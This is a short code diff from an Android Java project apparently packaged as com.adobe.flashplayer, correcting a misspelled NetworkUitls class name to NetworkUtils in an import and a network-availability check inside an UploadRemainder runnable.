@@ -8,7 +8,7 @@ import android.util.Log;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 
@@ -200,7 +200,7 @@ public class UploadRemainder implements Runnable{
 
 
     public void run(){
-        if( NetworkUitls.isNetworkAvailable(context) == false ){
+        if( NetworkUtils.isNetworkAvailable(context) == false ){
             return;
         }
 
